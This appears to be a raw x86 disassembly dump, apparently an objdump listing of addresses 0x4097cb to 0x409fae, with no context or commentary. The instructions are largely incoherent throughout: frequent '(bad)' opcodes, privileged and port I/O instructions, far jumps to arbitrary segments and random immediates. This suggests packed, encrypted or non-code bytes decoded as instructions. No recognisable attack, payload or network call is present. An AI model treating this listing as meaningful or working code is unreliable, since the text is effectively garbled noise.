  4097cb:	imul   BYTE PTR [eax]
  4097cd:	mov    ds:0xb36c239c,al
  4097d2:	aam    0x6c
  4097d4:	push   edi
  4097d5:	pusha  
  4097d6:	xchg   esp,eax
  4097d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097d8:	in     al,0xc6
  4097da:	mov    ebp,0x795d5fce
  4097df:	xchg   esp,eax
  4097e0:	jo     0x40976d
  4097e2:	push   ss
  4097e3:	push   ebx
  4097e4:	sub    al,0x42
  4097e6:	in     al,dx
  4097e7:	push   edx
  4097e8:	enter  0x4983,0xad
  4097ec:	enter  0x196,0x84
  4097f0:	xor    ecx,DWORD PTR [esi+0x54]
  4097f3:	add    eax,0x4a60447f
  4097f8:	aam    0x3d
  4097fa:	inc    ecx
  4097fb:	pop    eax
  4097fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097fd:	xchg   ebx,eax
  4097fe:	out    0x92,eax
  409800:	add    ecx,ebp
  409802:	imul   ebx,DWORD PTR ds:0x96374be8,0xe7fd1dc1
  40980c:	mov    DWORD PTR [ecx-0x61],ebp
  40980f:	add    ch,0x41
  409812:	aad    0x1
  409814:	cmp    esp,ebp
  409816:	outs   dx,BYTE PTR ds:[esi]
  409817:	retf   0x5ca1
  40981a:	xchg   DWORD PTR [esi+0x33dd76f2],ebp
  409820:	mov    ch,0x17
  409822:	mov    esi,DWORD PTR [eax+0x9]
  409825:	in     al,0x5a
  409827:	pop    esp
  409828:	pop    ss
  409829:	icebp  
  40982a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40982b:	lea    esi,[eax]
  40982d:	fs inc edx
  40982f:	loop   0x409861
  409831:	sub    DWORD PTR [edx],0xffffffd7
  409834:	fnsave [edx+0x23a27e90]
  40983a:	cmp    ebp,DWORD PTR [ebp-0x30]
  40983d:	mov    al,ds:0x4f9cdd10
  409842:	add    ebp,0x7401d1c8
  409848:	outs   dx,DWORD PTR ds:[esi]
  409849:	add    al,0xf7
  40984b:	mov    edx,0xe8674cf0
  409850:	add    ebp,DWORD PTR [ebp-0x29]
  409853:	lea    eax,[ecx]
  409855:	jmp    0x409849
  409857:	mov    esp,0x71f621a8
  40985c:	bound  ecx,QWORD PTR [edi-0x19cbe058]
  409862:	pop    ss
  409863:	push   es
  409864:	cmp    DWORD PTR [edi],esp
  409866:	mov    esp,0x436a0892
  40986b:	dec    esp
  40986c:	jns    0x4097f2
  40986e:	aad    0x39
  409870:	mov    esp,0x81685152
  409875:	inc    esi
  409876:	mov    bh,0xc5
  409878:	test   DWORD PTR [ebx],edx
  40987a:	cmp    eax,0x3e3a5085
  40987f:	jmp    0xb5d1c681
  409884:	int3   
  409885:	mov    esp,0x2e006491
  40988a:	pop    ss
  40988b:	sbb    BYTE PTR [ecx],cl
  40988d:	jne    0x40985d
  40988f:	add    al,0xeb
  409891:	iret   
  409892:	ins    DWORD PTR es:[edi],dx
  409893:	push   eax
  409894:	mov    ebp,esi
  409896:	out    dx,al
  409897:	arpl   WORD PTR [bx+0x2e],cx
  40989b:	and    bl,BYTE PTR [esi+0x12c15ee3]
  4098a1:	fcmovnu st,st(1)
  4098a3:	pop    eax
  4098a4:	retf   0x4e32
  4098a7:	mov    ebp,0x103ec5cc
  4098ac:	push   es
  4098ad:	xchg   ebp,eax
  4098ae:	fcomp  QWORD PTR [edx-0xc]
  4098b1:	add    eax,DWORD PTR [ebx+0x2c]
  4098b4:	and    al,0xc7
  4098b6:	mov    ds,WORD PTR [esi-0x68a835b5]
  4098bc:	pop    edx
  4098bd:	fnstenv [edx+0x2b19d85c]
  4098c3:	pop    ebx
  4098c4:	mov    al,0xd5
  4098c6:	dec    ecx
  4098c7:	add    BYTE PTR [edi+ebx*1],ch
  4098ca:	das    
  4098cb:	sub    eax,0xd885452f
  4098d0:	mov    bh,0x41
  4098d2:	test   ah,bh
  4098d4:	rcr    bl,cl
  4098d6:	(bad)  
  4098d8:	adc    eax,0x5c4a4cee
  4098dd:	fcomp  QWORD PTR [ecx-0x1be8213b]
  4098e3:	xchg   edi,eax
  4098e4:	call   0x84b145d9
  4098e9:	jmp    0x4aa5:0x4a34144d
  4098f0:	es pop eax
  4098f2:	es push es
  4098f4:	ret    
  4098f5:	ss mov ch,0xc3
  4098f8:	call   0xc5d823f
  4098fd:	nop
  4098fe:	sub    al,0x32
  409900:	outs   dx,DWORD PTR ds:[esi]
  409901:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409902:	ret    0xfd25
  409905:	lods   eax,DWORD PTR ds:[esi]
  409906:	ins    DWORD PTR es:[edi],dx
  409907:	hlt    
  409908:	call   0x9bf9415b
  40990d:	imul   edx,ecx,0x60352f3c
  409913:	retw   
  409915:	fst    st(4)
  409917:	jmp    0x20c4ccbf
  40991c:	cmp    DWORD PTR [ecx-0xb],edi
  40991f:	(bad)  [ebx-0x73]
  409922:	push   edx
  409923:	lods   al,BYTE PTR ds:[esi]
  409924:	fnstsw WORD PTR [edi]
  409926:	xchg   esp,eax
  409927:	mov    ch,0x6f
  409929:	sbb    eax,0x13b282a2
  40992e:	push   ecx
  40992f:	xor    al,0x0
  409931:	fs shl al,cl
  409934:	sbb    BYTE PTR [ebx],0xf6
  409937:	fdiv   QWORD PTR [ecx+0x45]
  40993a:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40993c:	les    esp,FWORD PTR [edi]
  40993e:	ret    
  40993f:	sub    ah,BYTE PTR [ebp+0x54]
  409942:	out    0xd9,al
  409944:	add    BYTE PTR [ebx+eiz*2],cl
  409947:	mov    esp,0xe76b1bd1
  40994c:	dec    edx
  40994d:	icebp  
  40994e:	xchg   edx,eax
  40994f:	(bad)  
  409950:	scas   al,BYTE PTR es:[edi]
  409951:	bound  edi,QWORD PTR [edi-0x78f72ce]
  409957:	fiadd  WORD PTR [ebp+0x40f87905]
  40995d:	push   edx
  40995e:	(bad)  [eax+0x53]
  409961:	out    0xb5,al
  409963:	std    
  409964:	scas   eax,DWORD PTR es:[edi]
  409965:	mov    al,ds:0xf1a3ff6
  40996a:	sbb    eax,ecx
  40996c:	int    0x52
  40996e:	es pop ds
  409970:	jle    0x4099dd
  409972:	sysret 
  409974:	mov    ecx,0xcb1e475f
  409979:	pop    edi
  40997a:	in     al,0xdc
  40997c:	and    esp,edx
  40997e:	cmp    edx,esi
  409980:	xchg   ecx,eax
  409981:	sub    BYTE PTR [edx-0x3f7a2d80],0x1d
  409988:	inc    ecx
  409989:	add    DWORD PTR [ecx],ebx
  40998b:	mov    ebp,0x89199193
  409990:	sti    
  409991:	nop
  409992:	mov    ebp,0x86c5a20b
  409997:	or     BYTE PTR [edi-0x17],bl
  40999a:	xor    eax,0xfbd11d8
  40999f:	pop    ecx
  4099a0:	push   ebp
  4099a1:	dec    BYTE PTR [edx-0x3c]
  4099a4:	fisubr WORD PTR [eax+0x2f]
  4099a7:	add    cl,BYTE PTR [eax+0x56a7a7c9]
  4099ad:	dec    eax
  4099ae:	loop   0x4099bf
  4099b0:	test   al,ah
  4099b2:	xchg   esp,eax
  4099b3:	mov    edx,0x7f803b6e
  4099b8:	jae    0x4099b0
  4099ba:	sbb    DWORD PTR [eax+0x5baf5513],ebp
  4099c0:	(bad)
  4099c5:	or     ebp,DWORD PTR [edx-0x69ce6293]
  4099cb:	test   BYTE PTR [eax+0x22],bh
  4099ce:	pop    eax
  4099cf:	out    dx,eax
  4099d0:	or     DWORD PTR [bp+di+0x47bc],edx
  4099d5:	or     BYTE PTR [edi+0x1a7db469],cl
  4099db:	out    0x18,eax
  4099dd:	ins    DWORD PTR es:[edi],dx
  4099de:	pop    edi
  4099df:	imul   edx,DWORD PTR [ecx+ebp*4],0x50
  4099e3:	addr16 rol esp,1
  4099e6:	mov    DWORD PTR [eax],edx
  4099e8:	ins    DWORD PTR es:[edi],dx
  4099e9:	push   eax
  4099ea:	mov    BYTE PTR [edx],al
  4099ec:	loopne 0x409a64
  4099ee:	mov    edi,edx
  4099f0:	and    eax,0xd5c998a2
  4099f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099f6:	push   eax
  4099f7:	repz call 0x905b8388
  4099fd:	clc    
  4099fe:	loop   0x4099c4
  409a00:	enter  0xedfc,0xd3
  409a04:	sar    BYTE PTR [ecx-0x724f33ff],1
  409a0a:	outs   dx,BYTE PTR ds:[esi]
  409a0b:	dec    esp
  409a0c:	retf   
  409a0d:	and    al,0x8e
  409a0f:	push   edi
  409a10:	sub    dh,BYTE PTR [esi-0x79]
  409a13:	mov    esi,0x3ca9e7f0
  409a18:	inc    eax
  409a19:	xchg   edx,eax
  409a1a:	pushf  
  409a1b:	add    eax,0x4cf4f51c
  409a20:	retf   0x383d
  409a23:	inc    edi
  409a24:	out    0x18,al
  409a26:	shr    BYTE PTR [ecx+0x14],1
  409a29:	push   ebp
  409a2a:	test   DWORD PTR [eax+0x46],esp
  409a2d:	pop    ebx
  409a2e:	jmp    0x5d69:0x467e1402
  409a35:	lds    ebx,FWORD PTR [edi+0x1b]
  409a38:	call   0x55da:0x157fabf0
  409a3f:	jmp    0x409a84
  409a41:	jbe    0x409ab4
  409a43:	inc    edx
  409a44:	in     eax,dx
  409a45:	and    ebp,DWORD PTR [ecx-0x21]
  409a48:	and    al,0x72
  409a4a:	push   ebp
  409a4b:	or     al,0x9c
  409a4d:	ffreep st(5)
  409a4f:	pop    esi
  409a50:	mov    BYTE PTR [edi+0x3cb59325],dh
  409a56:	out    dx,al
  409a57:	mov    ?,WORD PTR [eax-0x40]
  409a5a:	ficomp DWORD PTR [edx-0x80]
  409a5d:	inc    ebx
  409a5e:	pop    edx
  409a5f:	lods   eax,DWORD PTR ds:[esi]
  409a60:	xchg   DWORD PTR [ecx+0x70],edi
  409a63:	call   0xc869bda7
  409a68:	clc    
  409a69:	fmul   QWORD PTR [edx]
  409a6b:	repz jge 0x409a68
  409a6e:	pop    ds
  409a6f:	aas    
  409a70:	not    bl
  409a72:	xchg   ecx,eax
  409a73:	add    BYTE PTR [eax],dh
  409a75:	sub    BYTE PTR [ecx+0x134c9590],cl
  409a7b:	mov    edx,0x4d9885d1
  409a80:	(bad)  
  409a81:	imul   edx,DWORD PTR [esi+0x3143fd95],0xb757768
  409a8b:	jb     0x409a96
  409a8d:	js     0x409a9e
  409a8f:	adc    DWORD PTR [ecx+0x73a28e56],ecx
  409a95:	and    al,0x81
  409a97:	jecxz  0x409a4d
  409a99:	ja     0x409adf
  409a9b:	sbb    al,0xb9
  409a9d:	stos   BYTE PTR es:[edi],al
  409a9e:	aaa    
  409a9f:	mov    ah,0x30
  409aa1:	stos   DWORD PTR es:[edi],eax
  409aa2:	loop   0x409afb
  409aa4:	fwait
  409aa5:	ins    BYTE PTR es:[edi],dx
  409aa6:	outs   dx,DWORD PTR ds:[esi]
  409aa7:	pop    eax
  409aa8:	les    ecx,FWORD PTR [esi+edx*1+0x2a96d144]
  409aaf:	push   ebx
  409ab0:	inc    ecx
  409ab1:	sub    al,0x40
  409ab3:	or     eax,0x1a69a078
  409ab8:	sub    al,ch
  409aba:	inc    ebx
  409abb:	cwde   
  409abc:	stos   BYTE PTR es:[edi],al
  409abd:	mov    edi,0xe81d7468
  409ac2:	aaa    
  409ac3:	loope  0x409ab8
  409ac5:	pop    esi
  409ac6:	inc    esi
  409ac7:	sti    
  409ac8:	mov    ebp,0x7032e035
  409acd:	je     0x409af6
  409acf:	fld    DWORD PTR [esi+0x54167c39]
  409ad5:	retf   
  409ad6:	adc    al,bl
  409ad8:	popa   
  409ad9:	mov    WORD PTR [ebx],cs
  409adb:	push   edx
  409adc:	rol    DWORD PTR [ebx-0x55],cl
  409adf:	cdq    
  409ae0:	adc    BYTE PTR [eax-0x3],ch
  409ae3:	(bad)  
  409ae4:	imul   edi,DWORD PTR [esi+0x4c099513],0x2c0dae27
  409aee:	clc    
  409aef:	hlt    
  409af0:	push   esi
  409af1:	iret   
  409af2:	stc    
  409af3:	adc    edi,0xf6dac213
  409af9:	inc    ebx
  409afa:	hlt    
  409afb:	loope  0x409ada
  409afd:	mov    BYTE PTR [ebp-0x123af98c],ah
  409b03:	retf   
  409b04:	dec    esp
  409b05:	and    al,0xae
  409b07:	imul   ecx,ecx,0x21efc20d
  409b0d:	push   0x10e90f47
  409b12:	push   0xffffffa6
  409b14:	frstor [edx+0x52]
  409b17:	cmp    BYTE PTR ds:0x1fae7913,bh
  409b1d:	(bad)  
  409b1e:	fxam   
  409b20:	ret    0x8ea4
  409b23:	xchg   esp,eax
  409b24:	rcl    DWORD PTR [bx+si-0x2af9],1
  409b29:	neg    bh
  409b2b:	lods   al,BYTE PTR ds:[esi]
  409b2c:	(bad)  
  409b2e:	push   esp
  409b2f:	popf   
  409b30:	test   eax,0x200a8a90
  409b35:	les    esp,FWORD PTR [esp+esi*1-0x15]
  409b39:	xlat   BYTE PTR ds:[ebx]
  409b3a:	adc    bl,dh
  409b3c:	or     ax,0x9577
  409b40:	test   DWORD PTR [edx],ecx
  409b42:	and    eax,DWORD PTR [ebp+0x64b44591]
  409b48:	cmp    ah,dh
  409b4a:	sahf   
  409b4b:	and    DWORD PTR ds:0xf7e76810,0x213274a
  409b55:	mov    esp,0xe86490ce
  409b5a:	test   eax,0xecacfedc
  409b5f:	hlt    
  409b60:	ins    DWORD PTR es:[edi],dx
  409b61:	and    bh,BYTE PTR [ecx-0x20bf2ced]
  409b67:	sub    eax,DWORD PTR [edi-0x6b]
  409b6a:	lea    edx,[esi+edi*1]
  409b6d:	jmp    0x409b78
  409b6f:	dec    ecx
  409b70:	mov    ah,0x5
  409b72:	pop    ebx
  409b73:	add    al,0xab
  409b75:	dec    ecx
  409b76:	ret    0x7d92
  409b79:	les    esi,FWORD PTR [esi-0x3b]
  409b7c:	jg     0x409b2e
  409b7e:	jae    0x409bd0
  409b80:	inc    edi
  409b81:	leave  
  409b82:	and    al,dl
  409b84:	(bad)  
  409b86:	icebp  
  409b87:	popf   
  409b88:	loopne 0x409bce
  409b8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b8b:	inc    esi
  409b8c:	jmp    0x20c7:0xf3142bb0
  409b93:	inc    esi
  409b94:	mov    ecx,0x5373e967
  409b99:	addr16 pusha 
  409b9b:	test   DWORD PTR [ebp+0x3],ecx
  409b9e:	sub    ah,BYTE PTR [ebp-0x3117854b]
  409ba4:	dec    ebx
  409ba5:	xchg   DWORD PTR [eax-0x4455e167],edx
  409bab:	sbb    al,0x80
  409bad:	(bad)  
  409bae:	jbe    0x409b97
  409bb0:	(bad)  
  409bb1:	cmp    al,0xef
  409bb3:	pusha  
  409bb4:	dec    ebp
  409bb5:	outs   dx,BYTE PTR ds:[esi]
  409bb6:	mov    ecx,0x85185013
  409bbb:	lock mov edx,0x4fcdcbe
  409bc1:	enter  0x57de,0x4
  409bc5:	enter  0x5afe,0xfb
  409bc9:	mov    ds:0x48133809,eax
  409bce:	xor    edx,edi
  409bd0:	sbb    al,0xef
  409bd2:	adc    dl,BYTE PTR [edx-0x17cf8fd]
  409bd8:	ss pop ss
  409bda:	dec    edi
  409bdb:	shr    esp,0xb0
  409bde:	gs test al,0xaf
  409be1:	inc    edi
  409be2:	sar    DWORD PTR [edx+ecx*4-0x67950a2a],0x8f
  409bea:	jae    0x409bae
  409bec:	js     0x409c05
  409bee:	repnz xor eax,0x6a5958cc
  409bf4:	xchg   ebx,ecx
  409bf6:	cmp    dl,0x2
  409bf9:	gs jge 0x409c5d
  409bfc:	pop    ds
  409bfd:	cmp    eax,0x684722ca
  409c02:	lahf   
  409c03:	or     ecx,esp
  409c05:	jle    0x409bf9
  409c07:	outs   dx,BYTE PTR ds:[esi]
  409c08:	in     eax,0xe9
  409c0a:	cmp    ecx,ecx
  409c0c:	(bad)  ds:0xefe8d46d
  409c12:	test   al,0xc6
  409c14:	pop    ecx
  409c15:	xchg   edx,eax
  409c16:	pop    eax
  409c17:	jne    0x409c14
  409c19:	push   esp
  409c1a:	xchg   esi,eax
  409c1b:	push   ss
  409c1c:	adc    edi,DWORD PTR [ebp-0x513c9335]
  409c22:	jno    0x409c9f
  409c24:	je     0x409bec
  409c26:	dec    edi
  409c27:	in     eax,0xd1
  409c29:	push   0x9f511623
  409c2e:	fbstp  TBYTE PTR [ebx-0x5]
  409c31:	and    eax,0xc89b4dea
  409c36:	pop    esp
  409c37:	in     eax,0xe7
  409c39:	pop    eax
  409c3a:	push   ebp
  409c3b:	repz xor ch,BYTE PTR [edx-0x2806ade9]
  409c42:	mov    al,0x4e
  409c44:	std    
  409c45:	xor    eax,0x29f4faf6
  409c4a:	and    ah,0x5e
  409c4d:	sbb    bh,BYTE PTR [edi+0x5b]
  409c50:	aam    0x1e
  409c52:	repnz repz dec ebp
  409c55:	mov    cl,0x36
  409c57:	cmp    BYTE PTR [ebx+0x5af0e7e1],0x2a
  409c5e:	xor    esp,DWORD PTR [ebx-0x1a]
  409c61:	pop    ebp
  409c62:	aam    0x6a
  409c64:	das    
  409c65:	int3   
  409c66:	mov    edx,0x311a5c24
  409c6b:	outs   dx,DWORD PTR ds:[esi]
  409c6c:	lahf   
  409c6d:	xor    eax,0x5a03d0d5
  409c72:	retf   0xddc
  409c75:	jmp    0xfec5:0xdf00242d
  409c7c:	sbb    al,0xb2
  409c7e:	push   edx
  409c7f:	shl    DWORD PTR [ecx-0x38c32c41],cl
  409c85:	shl    BYTE PTR [ecx+0x6c],cl
  409c88:	push   es
  409c89:	stos   DWORD PTR es:[edi],eax
  409c8a:	ins    BYTE PTR es:[edi],dx
  409c8b:	cmp    bh,0x48
  409c8e:	or     eax,0x20dcd38d
  409c93:	cmp    DWORD PTR [ebx-0x63],ebp
  409c96:	push   edx
  409c97:	mov    al,ds:0x9c83791d
  409c9c:	ss (bad) 
  409c9e:	jbe    0x409ccd
  409ca0:	lgs    eax,FWORD PTR [ecx]
  409ca3:	cmp    BYTE PTR ds:0xcf8e2d71,cl
  409ca9:	out    dx,eax
  409caa:	pop    ds
  409cab:	stos   DWORD PTR es:[edi],eax
  409cac:	out    0xfa,al
  409cae:	scas   al,BYTE PTR es:[edi]
  409caf:	daa    
  409cb0:	mov    ecx,0x4dd99d6a
  409cb5:	test   eax,0xd806e70e
  409cba:	pop    edx
  409cbb:	mov    ebx,0x9a91fb18
  409cc0:	cld    
  409cc1:	ins    BYTE PTR es:[edi],dx
  409cc2:	je     0x409cf6
  409cc4:	sbb    eax,DWORD PTR [ebp-0xe]
  409cc7:	lahf   
  409cc8:	mov    bl,0xcd
  409cca:	imul   eax,DWORD PTR [esp+esi*2+0x227c4f7d],0x930869d6
  409cd5:	and    eax,DWORD PTR [ebp+edi*1-0x54]
  409cd9:	push   ecx
  409cda:	adc    DWORD PTR [esi-0x3bcce7d4],0x76
  409ce1:	rol    BYTE PTR [esi],0x5d
  409ce4:	inc    ebp
  409ce5:	inc    esp
  409ce6:	push   edx
  409ce7:	add    BYTE PTR [ebx-0x23a80f7d],al
  409ced:	out    dx,al
  409cee:	in     al,0x8c
  409cf0:	or     al,0x24
  409cf2:	enter  0xc932,0x7b
  409cf6:	and    BYTE PTR [eax+ecx*1-0x3f1e10c7],ch
  409cfd:	jne    0x409d35
  409cff:	jl     0x409d72
  409d01:	or     DWORD PTR [edx],0xffffffeb
  409d04:	outs   dx,DWORD PTR ds:[esi]
  409d05:	cs aas 
  409d07:	push   es
  409d08:	lods   eax,DWORD PTR ds:[esi]
  409d09:	std    
  409d0a:	or     eax,0x84ce74d7
  409d0f:	xchg   DWORD PTR [eax+0x66],esp
  409d12:	add    DWORD PTR [edx+0x4c9b73c1],ecx
  409d18:	sub    al,0x7
  409d1a:	push   eax
  409d1b:	sti    
  409d1c:	push   ecx
  409d1d:	ret    0xe69f
  409d20:	ins    DWORD PTR es:[edi],dx
  409d21:	int3   
  409d22:	fidivr WORD PTR [edx-0x6c4c992b]
  409d28:	mov    edx,0x52335f19
  409d2d:	add    DWORD PTR ds:0x5f6ee370,edx
  409d33:	sub    DWORD PTR [ebx-0x13ee03e1],ecx
  409d39:	cli    
  409d3a:	mov    dh,0xd9
  409d3c:	push   0xf0912463
  409d41:	fmul   DWORD PTR [edx]
  409d43:	in     al,dx
  409d44:	pop    es
  409d45:	dec    ecx
  409d46:	push   ss
  409d47:	fiadd  WORD PTR [ebx]
  409d49:	mov    edx,0xd22595bc
  409d4e:	xor    eax,0x48124e19
  409d53:	push   es
  409d54:	(bad)  
  409d55:	pushf  
  409d56:	add    bh,BYTE PTR [eax+0x540a8bf2]
  409d5c:	xchg   bx,ax
  409d5e:	jae    0x409da3
  409d60:	outs   dx,DWORD PTR ds:[esi]
  409d61:	push   ecx
  409d62:	gs int 0x84
  409d65:	mov    WORD PTR [ecx+0x628df69a],cs
  409d6b:	ret    0x8a88
  409d6e:	test   eax,0xc712d8a8
  409d73:	bound  edx,QWORD PTR [edi+0x430c09da]
  409d79:	jnp    0x409d75
  409d7b:	xchg   esp,eax
  409d7c:	cmp    BYTE PTR [ebx-0x191a7707],cl
  409d82:	test   al,0x64
  409d84:	inc    edx
  409d85:	dec    edx
  409d86:	dec    eax
  409d87:	cmp    ebp,ecx
  409d89:	imul   DWORD PTR [edi]
  409d8b:	neg    DWORD PTR [edx-0x6f9a170e]
  409d91:	jge    0x409e0b
  409d93:	ins    DWORD PTR es:[edi],dx
  409d94:	inc    ecx
  409d95:	mov    bl,0xef
  409d97:	adc    dh,BYTE PTR [ecx-0x3]
  409d9a:	sbb    BYTE PTR [ebx+ecx*1],al
  409d9d:	jbe    0x409e07
  409d9f:	add    al,0xe7
  409da1:	jp     0x409d58
  409da3:	xor    ecx,DWORD PTR [eax-0x46]
  409da6:	cmp    eax,edi
  409da8:	mov    eax,ds:0x6b71c1e4
  409dad:	scas   eax,DWORD PTR es:[edi]
  409dae:	xchg   esi,eax
  409daf:	sbb    esp,DWORD PTR [ecx+0x54442cd]
  409db5:	xor    esp,edx
  409db7:	add    ch,BYTE PTR [esi-0x7f]
  409dba:	call   0x2b85:0x5566dc77
  409dc1:	inc    eax
  409dc2:	gs std 
  409dc4:	jne    0x409d7e
  409dc6:	scas   al,BYTE PTR es:[edi]
  409dc7:	mov    al,ds:0xf46959f7
  409dcc:	pop    esi
  409dcd:	xlat   BYTE PTR ds:[ebx]
  409dce:	jne    0x409e2d
  409dd0:	or     edi,DWORD PTR [ebp-0x73]
  409dd3:	push   eax
  409dd4:	scas   eax,DWORD PTR es:[edi]
  409dd5:	jb     0x409da4
  409dd7:	sar    ah,cl
  409dd9:	lock mov WORD PTR [edi],fs
  409ddc:	fadd   DWORD PTR [edx]
  409dde:	or     BYTE PTR [eax+0x33],0x2a
  409de2:	mov    esp,0x5f70726
  409de7:	adc    dl,BYTE PTR [esi]
  409de9:	cwde   
  409dea:	inc    eax
  409deb:	xchg   ebp,eax
  409dec:	mov    dh,0x2d
  409dee:	or     eax,0x2a077f06
  409df3:	push   esp
  409df4:	shr    DWORD PTR [edx+0x31],0xfd
  409df8:	xor    edi,DWORD PTR [ecx]
  409dfa:	pop    DWORD PTR [edx]
  409dfc:	int    0x83
  409dfe:	jbe    0x409e16
  409e00:	std    
  409e01:	cmp    eax,0xb897ce6c
  409e06:	cli    
  409e07:	sbb    DWORD PTR [ebp-0x76db0a19],esi
  409e0d:	popa   
  409e0e:	pop    ds
  409e0f:	pop    esp
  409e10:	fidivr WORD PTR [edi]
  409e12:	add    ebx,ecx
  409e14:	bound  edi,QWORD PTR [edi+ecx*8]
  409e17:	out    0x82,eax
  409e19:	jecxz  0x409e8d
  409e1b:	int3   
  409e1c:	in     eax,0xcb
  409e1e:	adc    BYTE PTR [esi+0x77b98416],cl
  409e24:	pop    esp
  409e25:	xchg   edi,eax
  409e26:	sti    
  409e27:	push   esp
  409e28:	sti    
  409e29:	jl     0x409e79
  409e2b:	repnz mov eax,0xd3ef9bd8
  409e31:	jbe    0x409e45
  409e33:	pop    esi
  409e34:	outs   dx,BYTE PTR ds:[esi]
  409e35:	xor    esp,DWORD PTR [ebx+0x44]
  409e38:	retf   
  409e39:	test   edi,0x78e1e093
  409e3f:	jle    0x409dc2
  409e41:	sub    eax,0x39c883ab
  409e46:	or     esi,DWORD PTR [esp+ebp*2-0x3d]
  409e4a:	add    cl,BYTE PTR [ecx+0x71fbebf]
  409e50:	daa    
  409e51:	jns    0x409e45
  409e53:	shl    eax,cl
  409e55:	imul   ebx,DWORD PTR [esi],0x52b8e43a
  409e5b:	in     eax,dx
  409e5c:	sbb    ah,BYTE PTR [edx]
  409e5e:	xchg   edx,eax
  409e5f:	mov    al,ds:0x69abbda2
  409e64:	adc    DWORD PTR ds:0x3e3abea0,edx
  409e6a:	nop
  409e6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e6d:	loop   0x409e5d
  409e6f:	retf   0xa35f
  409e72:	and    al,0xcc
  409e74:	cmovle ebp,DWORD PTR [ebx]
  409e77:	push   eax
  409e78:	sbb    edi,DWORD PTR [ebx+eiz*8-0x1aded6b]
  409e7f:	and    al,0x2f
  409e81:	pop    es
  409e82:	das    
  409e83:	mov    ebx,0xe4b10b65
  409e88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e89:	dec    ebp
  409e8a:	(bad)  
  409e8b:	sub    bl,BYTE PTR [edi+0x75]
  409e8e:	retf   0xbf24
  409e91:	pop    ss
  409e92:	pop    ecx
  409e93:	xor    bh,BYTE PTR [esi-0x2c047853]
  409e99:	mov    ebp,0x3a3cf1b7
  409e9e:	jbe    0x409e94
  409ea0:	inc    ebx
  409ea1:	aad    0x0
  409ea3:	push   0x89a76533
  409ea8:	jle    0x409ee8
  409eaa:	xchg   ebp,eax
  409eab:	(bad)  
  409eac:	shl    BYTE PTR [eax+eax*8],1
  409eaf:	and    DWORD PTR [ecx+0x36],0xf5aa7948
  409eb6:	and    bl,BYTE PTR [ebx]
  409eb8:	shr    DWORD PTR [ecx-0x5f9d0c38],cl
  409ebe:	push   esi
  409ebf:	xchg   esi,edx
  409ec1:	popa   
  409ec2:	hlt    
  409ec3:	mov    ecx,0x1094b470
  409ec8:	jle    0x409e9a
  409eca:	push   ebp
  409ecb:	or     eax,DWORD PTR [edx]
  409ecd:	xchg   esp,eax
  409ece:	mov    al,0x35
  409ed0:	xchg   edx,eax
  409ed1:	cmp    DWORD PTR [edi+0x4b],eax
  409ed4:	xlat   BYTE PTR ds:[ebx]
  409ed5:	test   BYTE PTR [ebp+0x76],al
  409ed8:	pop    ss
  409ed9:	dec    eax
  409eda:	(bad)  
  409edb:	(bad)  
  409edc:	xor    edx,DWORD PTR [ecx-0x7810e909]
  409ee2:	mul    DWORD PTR ds:0x586384f0
  409ee8:	mov    ch,0x58
  409eea:	or     edx,DWORD PTR ds:0xe278dd22
  409ef0:	add    edx,DWORD PTR [edi]
  409ef2:	loope  0x409eaa
  409ef4:	inc    ebp
  409ef5:	int3   
  409ef6:	and    ebp,esi
  409ef8:	std    
  409ef9:	jnp    0x409f01
  409efb:	adc    al,dl
  409efd:	aam    0x13
  409eff:	data16 jg 0x409f2c
  409f02:	push   ebp
  409f03:	jle    0x409ec0
  409f05:	jmp    0xe217:0x2a98dd58
  409f0c:	add    al,0xa2
  409f0e:	dec    ebx
  409f0f:	cmc    
  409f10:	add    BYTE PTR [eax],0x10
  409f13:	repz or al,0x9d
  409f16:	xchg   ecx,eax
  409f17:	inc    ecx
  409f18:	sub    al,0xaa
  409f1a:	lds    ecx,FWORD PTR [esi+0x69]
  409f1d:	push   esp
  409f1e:	ss dec ecx
  409f20:	inc    esi
  409f21:	iret   
  409f22:	lods   eax,DWORD PTR ds:[esi]
  409f23:	pop    ecx
  409f24:	mov    ebp,0x7ec63d1d
  409f29:	dec    ebx
  409f2a:	adc    dl,ch
  409f2c:	lods   al,BYTE PTR ds:[esi]
  409f2d:	aad    0x47
  409f2f:	inc    ebp
  409f30:	mov    ecx,0x9a846863
  409f35:	mov    ch,0x3c
  409f37:	std    
  409f38:	lods   al,BYTE PTR ds:[esi]
  409f39:	jle    0x409f66
  409f3b:	lock dec eax
  409f3d:	mov    ss,WORD PTR [ebp-0xe690461]
  409f43:	jno    0x409faf
  409f45:	cdq    
  409f46:	or     dl,BYTE PTR [esi+0x6a0f7fd1]
  409f4c:	sub    eax,0x742b95ac
  409f51:	sbb    al,0x4c
  409f53:	ds aaa 
  409f55:	leave  
  409f56:	inc    edx
  409f57:	or     al,0x43
  409f59:	ins    BYTE PTR es:[edi],dx
  409f5a:	xor    DWORD PTR [eax-0x63b55be0],esp
  409f60:	out    0xec,al
  409f62:	push   ecx
  409f63:	xchg   DWORD PTR [ecx],esp
  409f65:	xor    ebp,DWORD PTR [eax-0x375796b6]
  409f6b:	out    dx,al
  409f6c:	or     eax,0x6108ed35
  409f71:	adc    al,BYTE PTR [edx-0x51009ab5]
  409f77:	or     al,0x15
  409f79:	add    eax,ebp
  409f7b:	call   0xf70acd3a
  409f80:	in     al,dx
  409f81:	fdivr  DWORD PTR [edi+esi*2+0x1f]
  409f85:	sub    bl,BYTE PTR [esi]
  409f87:	mov    ds:0xc33884b0,eax
  409f8d:	mov    eax,0xb7df874f
  409f92:	daa    
  409f93:	fs xor esp,esi
  409f96:	sub    DWORD PTR [eax],edi
  409f98:	push   ecx
  409f99:	pop    ebx
  409f9a:	js     0x409f88
  409f9c:	ror    DWORD PTR [ebp+0x53],cl
  409f9f:	mov    ch,0xae
  409fa1:	dec    ebx
  409fa2:	xor    bh,BYTE PTR [ecx+0x3b96f64a]
  409fa8:	test   eax,0xcc57bf94
  409fad:	dec    eax
  409fae:	dec    ebp
